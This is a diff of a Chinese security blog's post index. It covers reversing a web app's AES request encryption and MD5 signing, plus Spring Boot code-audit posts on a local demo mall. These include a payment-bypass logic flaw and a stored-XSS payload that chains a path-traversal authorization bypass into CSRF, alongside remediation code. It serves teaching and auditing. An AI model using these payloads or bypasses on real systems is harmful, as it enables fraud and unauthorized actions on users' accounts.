+<p>但有一点需要注意，前后端分离的系统，会对js压缩和混淆，一方面是减轻js的体量，另一方面能在一定程度上防止他人通过js分析出关键代码。所以在被压缩混淆的js中调试也还是有一定难度的。</p>
+<p>所幸网站的js很少，且大部分应用加密传输使用AES对报文进行加密，再使用RSA传输AES的密钥。</p>
+<p>随便找找就发现AES加密的js代码，在代码中发现加密方式是<code>CBC Pkcs7</code></p>
+<p>密钥o：<code>^BJSHGZ!@#ZZZDGJ</code>（密钥并不是这个，真实的密钥需要看变量n，数组arguments如果大于1，则使用arguments中的密钥，这个arguments具体是怎么来的我没搞懂，不过不重要，调试的时候我们能直接得到密钥的值，可以不用具体分析）</p>
+<p>偏移量iv：<code>0108489312380708</code></p>
+<p>AES加解密的过程如下图，还是比较清晰的。</p>
+<p><img src="/2020/04/03/JS-Decrypt/js-encrypt-code.png" alt="js-encrypt-code"></p>
+<p>下图是调试过程，密钥就直接拿到了：</p>
+<p><img src="/2020/04/03/JS-Decrypt/get-aes-key.png" alt="get-aes-key"></p>
+<p>⚠️ 这里有个js混淆的坑，对于不咋熟悉js的我，1824行 <code>u.default.encrypt</code>我还以为是另一种加密，在这里找这个是什么加密方法找了好久，结果它就是调用上图AES加密的方法，想太多了……</p>
+<p><img src="/2020/04/03/JS-Decrypt/aes-default-encrypt.jpg" alt="aes-default-encrypt"></p>
+<p>知道加解密方法，之后就可以尝试对参数进行修改了，同样是在调试过程，把参数取出，或者通过AES解密请求中的request body得到的请求参数，进行修改。</p>
+<p><img src="/2020/04/03/JS-Decrypt/unencrypt-request-body.png" alt="unencrypt-request-body"></p>
+<p>修改完成之后进行AES加密，我使用的是 <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">https://gchq.github.io/CyberChef/</a> ，加密过程调成如下图：</p>
+<p><img src="/2020/04/03/JS-Decrypt/cyberchef-aes-encrypt.png" alt="cyberchef-aes-encrypt"></p>
+<p>request body的加密就到这了。response body解密使用的密钥，iv，模式，填充都一样，是逆过程就不多写了。</p>
+<p>最后一个重点就是修改签名，修改完request body之后的签名肯定就变化了，就需要跟随请求来修改签名。</p>
+<p>签名大概的算法如下图，不咋懂js的我刚看到这时是一脸的懵逼。</p>
+<p><img src="/2020/04/03/JS-Decrypt/js-add-sign.png" alt="js-add-sign"></p>
+<p>不过好在可以调试，通过调试可以看到算出Q所需要的参数，不过不用那么麻烦，直接看Q前一步就行了，<code>Q = (0, g.default) (D).toString()</code>，也就是查看D是什么</p>
+<p>通过调试可以知道，D是：（去除了\）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">9924531585918379141792&#x2F;queryServices&#x2F;011023reqno&#x3D;M4NofxiOtz4SvYpx&#123;&quot;head&quot;:&#123;&quot;client&quot;:&quot;ABC&quot;,&quot;transactionno&quot;:&quot;72789911122233&quot;,&quot;transactiontype&quot;:&quot;lis&quot;,&quot;transactionexedate&quot;:&quot;2020-04-03&quot;,&quot;transactionexetime&quot;:&quot;01:26:29&quot;&#125;,&quot;body&quot;:&quot;120001111&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>D是由M+T+B+S+x组成的，我们修改的只是请求参数，请求参数在x中，也就是说我们修改其他参数我们都不用改。直接在调试过程中得到的D中修改请求参数，再对D进行hash就得到了sign。</p>
+<p>⚠️ 确定签名算法中有一步就是因为hash方法弄错了导致浪费了很多时间，我在js代码中某处看到了sha1，我就以为hash方法是sha1，结果hash方法是md5…… Orz 怪不得我之前的加签都和结果对不上，还以为漏了算法中的某一步。</p>
+<p><img src="/2020/04/03/JS-Decrypt/debug-sign.png" alt="debug-sign"></p>
+<h1 id="实操环节"><a href="#实操环节" class="headerlink" title="实操环节"></a>实操环节</h1><p>访问网页，打开F12开发者工具，选择Debugger，点击index.js，在1522行和1835行下断点，</p>
+<p>然后复制n和iv的值</p>
+<p><img src="/2020/04/03/JS-Decrypt/debug-aes-key.png" alt="debug-aes-key"></p>
+<p>其他配置可参考下图，mode是CBC，padding是pkcs7（如果你的AES加解密没有pkcs7，选pkcs5也是一样的）</p>
+<p><img src="/2020/04/03/JS-Decrypt/cyberchef-set-aes-encrypt.png" alt="cyberchef-set-aes-encrypt"></p>
+<p>点击继续，跳到下一个断点，这里可以复制E的值，E就是request body的值（记得得去掉<code>\</code>）直接得到请求内容，然后修改它。再复制D（去掉<code>\</code>），同样在请求参数中修改它。</p>
+<p><img src="/2020/04/03/JS-Decrypt/debug-sign-2.jpg" alt="debug-sign-2"></p>
+<p>修改完成之后，将E的值进行AES加密作为新的request body，D的值进行md5，就能得到signature的值。此时就能对报文参数修改测试了。</p>
+<p><img src="/2020/04/03/JS-Decrypt/burp-request.png" alt="burp-request"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Java SpringBoot框架代码审计二 - Spring Boot项目结构介绍</title>
+    <url>/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/</url>
+    <content><![CDATA[<h1 id="Spring-Boot项目结构"><a href="#Spring-Boot项目结构" class="headerlink" title="Spring Boot项目结构"></a>Spring Boot项目结构</h1><p>一个简单Spring Boot项目的目录结构如下图</p>
+<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/springboot-directory.png" alt="springboot-directory" style="zoom:33%;">
+
+<a id="more"></a>
+
+<p>Java代码都在<code>src/main/java/</code>目录下，<code>src/main/resources/</code>中放置资源文件。</p>
+<h2 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h2><p><code>common/</code>: 存放通用类，如工具类和通用返回结果</p>
+<p><code>config/</code>: 存放配置文件</p>
+<p><code>controller/</code>: 存放控制器，接收从前端传来的参数，对访问控制进行转发、各类基本参数校验或者不复用的业务简单处理等。</p>
+<p><code>dao/</code>: 数据访问层，与数据库进行交互，负责数据库操作，在Mybaits框架中存放自定义的Mapper接口</p>
+<p><code>entity/</code>: 存放实体类</p>
+<p><code>interceptor/</code>: 拦截器</p>
+<p><code>service/</code>: 存放服务类，负责业务模块逻辑处理。<code>Service</code>层中有两种类，一是<code>Service</code>，用来声明接口；二是<code>ServiceImpl</code>，作为实现类实现接口中的方法。</p>
+<p><code>utils/</code>: 存放工具类</p>
+<p><code>NewBeeMallApplication.java</code>: Spring Boot启动类</p>
+<p>非该项目，但可能存在的文件夹：</p>
+<p><code>dto/</code>:  存放数据传输对象（Data Transfer Object），如请求参数和返回结果</p>
+<p><code>vo/</code>:  视图对象（View Object）用于封装客户端请求的数据，防止部分数据泄漏，保证数据安全</p>
+<p><code>constant/</code>:  存放常量</p>
+<p><code>filter/</code>: 存放过滤器</p>
+<p><code>component/</code>: 存放组件</p>
+<h2 id="资源目录结构"><a href="#资源目录结构" class="headerlink" title="资源目录结构"></a>资源目录结构</h2><p>在<code>src/main/resources</code>下存放资源文件</p>
+<p><code>mapper/</code>: 存放Mybaits的mapper.xml文件</p>
+<p><code>static/</code>: 静态资源文件目录（Javascript、CSS、图片等），在这个目录中的所有文件可以被直接访问</p>
+<p><code>templates/</code>: 存放模版文件</p>
+<p><code>application.properties</code>: Spring Boot默认配置文件</p>
+<p>非该项目，但可能存在的文件：</p>
+<p><code>META-INF/</code>: 相当于一个信息包，目录中的文件和目录获得Java 2平台的认可与解释，用来配置应用程序、扩展程序、类加载器和服务</p>
+<p><code>i18n/</code>: 国际化文件的简称，来源是英文单词internationalization的首末字符i和n，18为中间的字符数</p>
+<h2 id="其他结构"><a href="#其他结构" class="headerlink" title="其他结构"></a>其他结构</h2><p>⚠️ Spring Boot无需配置 <code>web.xml</code>，但在其他Java项目中，<code>web.xml</code>是一个非常重要的文件，用来配置Servlet、Filter、Listener等。</p>
+<p><code>pom.xml</code>: maven的配置文件，记录项目信息、依赖信息、构建配置等</p>
+<p>如果使用gradle进行自动化构建，则会存在<code>build.gradle</code>文件</p>
+<h1 id="请求传递流程"><a href="#请求传递流程" class="headerlink" title="请求传递流程"></a>请求传递流程</h1><p>Java审计难上手的一大因素是Java一般都是大中型系统，架构相比于PHP开发的小系统会复杂很多，大型系统开发过程中难免出现不规范的编码习惯，再加上函数调用错综复杂，审计代码时光弄明白程序逻辑，理解程序员的编码习惯就要花费大量精力了。</p>
+<p>首先弄明白请求流程的处理，知道用户请求内容会经过哪些代码才能理解程序处理逻辑，可以对我们后续的审计提供非常大的帮助。</p>
+<p>用户的请求发送给服务器之后，中间件（案例项目使用的是Tomcat）会将请求解析发送给Spring的<code>DispatcherServlet</code>，<code>DispatcherServlet</code>的作用是分配请求，详细的过程我们暂时不深入。只需要知道中间件解析请求之后请求会经过Filter和Interceptor。Filter（过滤器）和Interceptor（拦截器）做的事很相似，但他们的触发时机不同，且Interceptor只在Spring中生效，它们可以用来对请求进行过滤字符、拦截、鉴权、日志记录等功能，简单说就是可以在参数进入应用前对其处理，做到全局的处理。</p>
+<p>请求经过Filter和Interceptor之后会被<code>DispatcherServlet</code>分配到对应路径的Controller（控制器），文件名为<code>ExampleController</code>，Controller负责简单的逻辑处理和参数校验功能，之后调用Service。</p>
+<p>Service主要负责业务模块逻辑处理。Service层中有两种类，一是接口类，文件名为<code>ExampleService</code>，用来声明接口；二是接口实现类，文件名为<code>ExampleServiceImpl</code>，作为实现类实现接口中的方法。实现的代码都在<code>ExampleServiceImpl</code>中。当Service涉及到数据库操作时就会调用Dao。</p>
+<p>Dao主要负责数据库的操作，由于使用Mybatis作为ORM框架，只做中间传递的作用，所有SQL语句都是写在配置文件中的，配置文件名为<code>ExampleMapper.xml</code>，存放在<code>src/main/resources/mapper</code>中。</p>
+<p>从用户请求到服务器处理的主要过程如下图所示（省略了<code>DispatcherServlet</code>）：</p>
+<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/request-path.png" alt="request-path" style="zoom:50%;">
+
+
+
+<p>为了更好理解，以「保存订单」功能为例，主要的请求流程如下图，不了解Spring请求传递的同学可以在代码中跟一遍请求流程，会加深请求传递的印象。</p>
+<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/request-example.png" alt="request-example" style="zoom:50%;">]]></content>
   </entry>
   <entry>
     <title>Java SpringBoot框架代码审计三 - SQL注入</title>
@@ -882,124 +882,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Java SpringBoot框架代码审计七 - 逻辑漏洞</title>
-    <url>/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/</url>
-    <content><![CDATA[<p>逻辑漏洞不像之前介绍的漏洞有一套固定的审计流程，每个逻辑漏洞背后的代码都不一样。通过纯白盒去找逻辑漏洞是比较费劲的，首先需要彻底了解业务，再带着各种疑问和奇怪的想法去审。</p>
-<a id="more"></a>
-
-<h1 id="逻辑漏洞代码审计过程"><a href="#逻辑漏洞代码审计过程" class="headerlink" title="逻辑漏洞代码审计过程"></a>逻辑漏洞代码审计过程</h1><p>用户正常的购物过程是<code>添加购物车-&gt;下单-&gt;付款-&gt;出库-&gt;交易成功</code>，但程序在购物过程中没有对前一步进行校验。下订单但未支付时，访问<code>/orders/{orderNo}/finish</code>可直接完成交易。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /src/main/java/ltd/newbee/mall/controller/mall/OrderController.java</span></span><br><span class="line"><span class="meta">@PutMapping</span>(<span class="string">"/orders/&#123;orderNo&#125;/finish"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Result <span class="title">finishOrder</span><span class="params">(@PathVariable(<span class="string">"orderNo"</span>)</span> String orderNo, HttpSession httpSession) </span>&#123;</span><br><span class="line">	NewBeeMallUserVO user = (NewBeeMallUserVO) httpSession.getAttribute(Constants.MALL_USER_SESSION_KEY);</span><br><span class="line">	String finishOrderResult = newBeeMallOrderService.finishOrder(orderNo, user.getUserId());</span><br><span class="line">	<span class="keyword">if</span> (ServiceResultEnum.SUCCESS.getResult().equals(finishOrderResult)) &#123;</span><br><span class="line">		<span class="keyword">return</span> ResultGenerator.genSuccessResult();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> ResultGenerator.genFailResult(finishOrderResult);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>从代码中可以看到直接调用<code>newBeeMallOrderService.finishOrder(orderNo, user.getUserId())</code>，对于该订单是否支付，是否出库等过程都没有校验。</p>
-<h1 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h1><p>随便添加一件物品到购物车，提交订单</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/submit-order.png" alt="submit-order"></p>
-<p>此时来到订单详情页面，按正常逻辑来下一步是付款操作</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/pay-order.png" alt="pay-order"></p>
-<p>在管理页面确认该订单当前状态是待支付</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/wait-for-payment.png" alt="wait-for-payment"></p>
-<p>使用PUT方法访问<code>http://localhost:8089/orders/15886680589866584/finish</code>即可直接完成订单</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/bypass-pay-order.png" alt="bypass-pay-order"></p>
-<p>因为代码使用的是<code>@PutMapping</code>，所以只能使用PUT方法访问，其他请求方法不会被执行</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/finishOrder.png" alt="finishOrder"></p>
-<p>再次查看订单，已经交易成功</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/paid-success.png" alt="paid-success"></p>
-<p>在管理页面查看该订单，证明交易成功。</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/show-orders.png" alt="show-orders"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Java SpringBoot框架代码审计六 - CSRF</title>
-    <url>/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/</url>
-    <content><![CDATA[<p>CSRF真正和代码相关的内容不太多，主要还是看过滤器和拦截器。代码审计中的思路是检查是否校验Referer、是否给cookie设置SameSite属性和敏感操作是否会生成CSRF token，如果都不存在再查看请求参数中是否存在不可被攻击者猜测的字段，比如验证码等参数。</p>
-<a id="more"></a>
-
-<h1 id="CSRF代码审计过程"><a href="#CSRF代码审计过程" class="headerlink" title="CSRF代码审计过程"></a>CSRF代码审计过程</h1><p>案例项目中不存在Referer校验和CSRF token，所以网站肯定存在多处CSRF。除了修改密码处需要的原密码攻击者无法知晓外，其他功能点均存在CSRF。</p>
-<p>我们以添加购物车功能为例，请求内容为下，没有任何token值</p>
-<img src="/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/add-to-shop-cart.png" alt="add-to-shop-cart" style="zoom:43%;">
-
-
-
-<p>由于是json格式的请求，不能直接使用burp Generate CSRF PoC，因为burp生成的PoC无法伪造Content-Type。burp生成的CSRF PoC请求内容如下，可以看到<code>Content-Type: text/plain</code>，并且post数据多出一个等号。</p>
-<img src="/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/csrf-request-add-shop-cart.png" alt="csrf-request-add-shop-cart" style="zoom: 43%;">
-
-<p>使用fetch跨域请求会先发送一个options请求，fetch设置no-cors模式又无法更改Content-Type。还有一种利用方法是使用flash+307跳转，这种方法只适用于老旧浏览器。</p>
-<p>不过我们可以利用之前审计出来的漏洞组合起来利用。</p>
-<p>首先我们通过未授权访问商品 <a href="http://localhost:8089/index/..;/admin/goods/edit/10896" target="_blank" rel="noopener">http://localhost:8089/index/..;/admin/goods/edit/10896</a></p>
-<p><img src="/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/edit-goods.png" alt="edit-goods"></p>
-<p>将商品详细信息改为，该<code>&lt;script&gt;</code>会发送添加商品10986到购物车的操作</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">const</span> authUrl = `http:<span class="comment">//localhost:8089/shop-cart`;</span></span></span><br><span class="line">	fetch(</span><br><span class="line">		authUrl,</span><br><span class="line">		&#123;</span><br><span class="line"><span class="actionscript">			method: <span class="string">'POST'</span>,</span></span><br><span class="line"><span class="actionscript">			credentials: <span class="string">'include'</span>,</span></span><br><span class="line">			headers: &#123;</span><br><span class="line"><span class="actionscript">				<span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>,</span></span><br><span class="line"><span class="actionscript">				<span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span></span></span><br><span class="line">			&#125;,</span><br><span class="line"><span class="actionscript">			body: <span class="string">'&#123;"goodsId":10896,"goodsCount":1&#125;'</span>,</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="javascript">	).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">throw</span> err;</span></span><br><span class="line"><span class="javascript">	&#125;).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line">	&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>因为富文本编辑器会将我们输入的内容编码，在保存过程中抓包，修改goodsDetailContent参数为XSS payload</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">\</span>"<span class="attr">text</span>/<span class="attr">javascript</span>\" <span class="attr">charset</span>=<span class="string">\</span>"<span class="attr">utf-8</span>\"&gt;</span><span class="javascript"><span class="keyword">const</span> authUrl=<span class="string">`http://localhost:8089/shop-cart`</span>;fetch(authUrl,&#123;<span class="attr">method</span>:<span class="string">'POST'</span>,<span class="attr">credentials</span>:<span class="string">'include'</span>,<span class="attr">headers</span>:&#123;<span class="string">'Content-Type'</span>:<span class="string">'application/json'</span>,<span class="string">'X-Requested-With'</span>:<span class="string">'XMLHttpRequest'</span>&#125;,<span class="attr">body</span>:<span class="string">'&#123;\"goodsId\":10896,\"goodsCount\":1&#125;'</span>&#125;).catch(<span class="function"><span class="params">err</span>=&gt;</span>&#123;<span class="keyword">throw</span> err;&#125;).then(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/update-xss-in-goods.png" alt="update-xss-in-goods"></p>
-<p>每当用户访问10896这个商品时都会触发XSS，然后XSS执行CSRF请求，将该商品添加到购物车中</p>
-<p><img src="/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/xss-combine-csrf.png" alt="xss-combine-csrf"></p>
-<p>查看购物车，发现该商品在未经人工操作的情况下被进入购物车。我们甚至还可以再添加结算和下订单操作，直接等待用户付款。</p>
-<p><img src="/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/auto-add-goods-in-shop-cart.png" alt="auto-add-goods-in-shop-cart"></p>
-<h1 id="CSRF修复"><a href="#CSRF修复" class="headerlink" title="CSRF修复"></a>CSRF修复</h1><h2 id="校验Referer"><a href="#校验Referer" class="headerlink" title="校验Referer"></a>校验Referer</h2><p>Spring中可以使用interceptor来校验Referer，以下代码为例：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RefererInterceptor</span> <span class="keyword">extends</span> <span class="title">HandlerInterceptorAdapter</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> AntPathMatcher matcher = <span class="keyword">new</span> AntPathMatcher();</span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	<span class="keyword">private</span> RefererProperties properties;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest req, HttpServletResponse resp, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		String referer = req.getHeader(<span class="string">"referer"</span>);</span><br><span class="line">		String host = req.getServerName();</span><br><span class="line">		<span class="keyword">if</span> (<span class="string">"POST"</span>.equals(req.getMethod())) &#123;  <span class="comment">// 只验证POST请求</span></span><br><span class="line">			<span class="keyword">if</span> (referer == <span class="keyword">null</span>) &#123; <span class="comment">//若referer为空</span></span><br><span class="line">				resp.setStatus(HttpServletResponse.SC_FORBIDDEN); <span class="comment">//返回403</span></span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125; </span><br><span class="line">			java.net.URL url = <span class="keyword">null</span>;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				url = <span class="keyword">new</span> java.net.URL(referer);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">				resp.setStatus(HttpServletResponse.SC_FORBIDDEN); <span class="comment">// URL解析异常，也置为403</span></span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (!host.equals(url.getHost())) &#123;  <span class="comment">// 首先判断请求域名和referer域名是否相同</span></span><br><span class="line">				<span class="keyword">if</span> (properties.getRefererDomain() != <span class="keyword">null</span>) &#123;  <span class="comment">// 如果不等，判断是否在白名单中</span></span><br><span class="line">					<span class="keyword">for</span> (String s : properties.getRefererDomain()) &#123;</span><br><span class="line">						<span class="keyword">if</span> (s.equals(url.getHost())) &#123;</span><br><span class="line">							<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="给cookie设置SameSite属性"><a href="#给cookie设置SameSite属性" class="headerlink" title="给cookie设置SameSite属性"></a>给cookie设置SameSite属性</h2><p>关于SameSite属性可参考 <a href="https://mp.weixin.qq.com/s/YqSxIvbgq1DkAlUL5rBtqA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/YqSxIvbgq1DkAlUL5rBtqA</a></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CookieServiceInterceptor</span> <span class="keyword">extends</span> <span class="title">HandlerInterceptorAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postHandle</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	HttpServletRequest request, HttpServletResponse response, Object handler, </span></span></span><br><span class="line"><span class="function"><span class="params">	ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="comment">//检查返回中是否存在"set-cookie"，若存在，则给其加上"SameSite"属性</span></span><br><span class="line">		Collection&lt;String&gt; headers = response.getHeaders(HttpHeaders.SET_COOKIE);</span><br><span class="line">		<span class="keyword">boolean</span> firstHeader = <span class="keyword">true</span>;</span><br><span class="line">		<span class="keyword">for</span> (String header : headers) &#123; <span class="comment">// 可能存在多个"Set-Cookie"属性，故采用for循环</span></span><br><span class="line">			<span class="keyword">if</span> (firstHeader) &#123;</span><br><span class="line">				response.setHeader(HttpHeaders.SET_COOKIE, String.format(<span class="string">"%s; %s"</span>,  header, <span class="string">"SameSite=strict"</span>)); <span class="comment">//可根据业务设置strict或者lax</span></span><br><span class="line">				firstHeader = <span class="keyword">false</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		response.addHeader(HttpHeaders.SET_COOKIE, String.format(<span class="string">"%s; %s"</span>,  header, <span class="string">"SameSite=strict"</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, </span></span></span><br><span class="line"><span class="function"><span class="params">	Object handler, Exception exception)</span> <span class="keyword">throws</span> Exception </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="设置CSRF-token"><a href="#设置CSRF-token" class="headerlink" title="设置CSRF token"></a>设置CSRF token</h2><p>CSRF token生成可以借助Spring Security框架，默认提供CSRF防护。Spring Security的CSRF防护是基于Filter来实现的，Spring Security提供多种保存token的策略，既可以保存在cookie中，也可以保存在session中，保存方法可以手动指定。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doFilterInternal</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">	request.setAttribute(HttpServletResponse<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>(), <span class="title">response</span>)</span>;</span><br><span class="line">	<span class="comment">// 通过tokenRepository从request中获取csrf token</span></span><br><span class="line">	CsrfToken csrfToken = <span class="keyword">this</span>.tokenRepository.loadToken(request);</span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">boolean</span> missingToken = csrfToken == <span class="keyword">null</span>;</span><br><span class="line">	<span class="comment">// 如果未获取到token则新生成token并保存</span></span><br><span class="line">	<span class="keyword">if</span> (missingToken) &#123;</span><br><span class="line">		csrfToken = <span class="keyword">this</span>.tokenRepository.generateToken(request);</span><br><span class="line">		<span class="keyword">this</span>.tokenRepository.saveToken(csrfToken, request, response);</span><br><span class="line">	&#125;</span><br><span class="line">	request.setAttribute(CsrfToken<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>(), <span class="title">csrfToken</span>)</span>;</span><br><span class="line">	request.setAttribute(csrfToken.getParameterName(), csrfToken);</span><br><span class="line">	<span class="comment">// 判断是否需要进行csrf token校验</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">this</span>.requireCsrfProtectionMatcher.matches(request)) &#123;</span><br><span class="line">		filterChain.doFilter(request, response);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 获取前端传过来的实际token</span></span><br><span class="line">	String actualToken = request.getHeader(csrfToken.getHeaderName());</span><br><span class="line">	<span class="keyword">if</span> (actualToken == <span class="keyword">null</span>) &#123;</span><br><span class="line">		actualToken = request.getParameter(csrfToken.getParameterName());</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 校验两个token是否相等</span></span><br><span class="line">	<span class="keyword">if</span> (!csrfToken.getToken().equals(actualToken)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.logger.isDebugEnabled()) &#123;</span><br><span class="line">			<span class="keyword">this</span>.logger.debug(<span class="string">"Invalid CSRF token found for "</span></span><br><span class="line">				+ UrlUtils.buildFullRequestUrl(request));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 如果是token缺失导致，则抛出MissingCsrfTokenException异常</span></span><br><span class="line">		<span class="keyword">if</span> (missingToken) &#123;</span><br><span class="line">			<span class="keyword">this</span>.accessDeniedHandler.handle(request, response,</span><br><span class="line">				<span class="keyword">new</span> MissingCsrfTokenException(actualToken));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 如果不是同一个token则抛出InvalidCsrfTokenException异常</span></span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">this</span>.accessDeniedHandler.handle(request, response,</span><br><span class="line">			<span class="keyword">new</span> InvalidCsrfTokenException(csrfToken, actualToken));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 执行下一个过滤器</span></span><br><span class="line">	filterChain.doFilter(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>注意，不管是校验Referer还是设置SameSite，都不能防止同站发起的CSRF，比如本文所举的例子就没法防范。XSS也可能从页面中获取CSRF token再进行攻击，这些防范方法都是提高攻击者的攻击难度，而不是完全消灭CSRF。真正重要的功能一定需要短信验证码或者密码之类的仅当前用户知道的参数才能进行操作，比如支付转账等。</p>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://docs.spring.io/spring-security/site/docs/current/reference/html5/#csrf-protection" target="_blank" rel="noopener">https://docs.spring.io/spring-security/site/docs/current/reference/html5/#csrf-protection</a></p>
-<p><a href="https://blog.csdn.net/junmoxi/article/details/89208311" target="_blank" rel="noopener">https://blog.csdn.net/junmoxi/article/details/89208311</a></p>
